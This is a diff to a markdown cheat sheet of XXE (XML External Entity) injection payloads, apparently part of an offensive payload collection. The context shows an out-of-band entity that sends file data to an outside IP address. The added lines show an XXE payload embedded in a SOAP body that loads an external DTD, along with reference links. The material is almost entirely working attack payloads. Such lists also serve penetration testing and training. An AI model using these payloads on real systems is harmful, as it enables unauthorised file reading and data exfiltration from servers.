@@ -96,6 +96,13 @@ File stored on http://92.222.81.2/dtd.xml
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>">
 ```
 
+XXE Inside SOAP
+```
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+```
+
+
 ## Thanks to
 * https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
 * http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html
+* https://gist.github.com/staaldraad/01415b990939494879b4
